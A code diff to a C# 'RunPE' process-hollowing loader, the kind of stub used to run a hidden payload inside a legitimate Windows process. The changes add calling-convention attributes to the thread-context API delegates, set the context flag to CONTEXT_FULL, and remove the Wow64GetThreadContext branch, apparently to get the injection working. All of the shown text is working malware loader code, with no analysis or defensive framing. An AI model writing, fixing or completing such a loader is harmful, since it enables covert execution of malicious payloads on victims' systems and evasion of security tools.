@@ -54,9 +54,16 @@ namespace RunPE
 
         #region API delegate
         private delegate int DelegateResumeThread(IntPtr handle);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
         private delegate bool DelegateWow64SetThreadContext(IntPtr thread, int[] context);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
         private delegate bool DelegateSetThreadContext(IntPtr thread, int[] context);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
         private delegate bool DelegateWow64GetThreadContext(IntPtr thread, int[] context);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
         private delegate bool DelegateGetThreadContext(IntPtr thread, int[] context);
         private delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
         private delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
@@ -151,18 +158,11 @@ namespace RunPE
                     int imageBase = BitConverter.ToInt32(payload, fileAddress + 0x34);
 
                     int[] context = new int[0xB3];
-                    context[0x0] = 0x10002;
+                    //context[0x0] = 0x10002;
+                    context[0x0] = 0x10007; // CONTEXT_FULL for x86
 
-                    if (IntPtr.Size == 0x4)
-                    {
-                        if (!GetThreadContext(pi.ThreadHandle, context))
-                            throw new Exception($"GetThreadContext failed. LastError={Marshal.GetLastWin32Error()}");
-                    }
-                    else
-                    {
-                        if (!Wow64GetThreadContext(pi.ThreadHandle, context))
-                            throw new Exception($"Wow64GetThreadContext failed. LastError={Marshal.GetLastWin32Error()}");
-                    }
+                    if (!GetThreadContext(pi.ThreadHandle, context))
+                        throw new Exception($"GetThreadContext failed. LastError={Marshal.GetLastWin32Error()}");
 
                     int ebx = context[0x29];
                     int baseAddress = 0x0;
